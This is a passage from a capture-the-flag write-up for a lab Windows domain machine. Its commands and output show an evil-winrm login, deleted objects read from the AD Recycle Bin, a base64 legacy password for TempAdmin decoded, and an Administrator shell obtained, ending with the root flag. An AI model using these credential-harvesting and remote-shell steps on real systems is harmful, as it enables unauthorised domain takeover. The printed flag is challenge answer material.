`w3lc0meFr31nd` is the password we can get by running this .NET code.<br>
Then, try to log in with the credential `ArkSvc:w3lc0meFr31nd`.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -u ArkSvc -p 'w3lc0meFr31nd' -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

As always, check what group `arksvc` in.<br>
We notice that this user is in the `AD Recycle Bin`.
```shell
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

`Get-ADobject` has an option `-includeDeletedObjects` for the deleted AD objects.<br>
Add `-and name -ne "Deleted Objects"` to remove "Deleted Objects" container that keeps objects have `isDeleted` attribute.<br>
```shell
*Evil-WinRM* PS C:\Users\arksvc\Documents> get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```


```shell
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

With the following command, we can view the deleted object for `TempAdmin` with GUID `f0cc344d-31e0-4866-bceb-a842791ca059`.
```shell
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Identity f0cc344d-31e0-4866-bceb-a842791ca059 -includeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Just like `r.thompson`, we can find `cascadeLegacyPwd` for user `TempAdmin`.
```shell
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```

By base64 decoding, we can achieve a password `baCT3r1aN00dles`.
```shell
root@kali:~# echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Using `evil-winrm`, we can achieve a shell as `Administrator`.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -u administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator
```

As usual, `root.txt` is in the directory `C:\Users\Administrator\Desktop`.
```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
5ec0a8c63a6e7b1da75c03b4ff7b7c0e
```
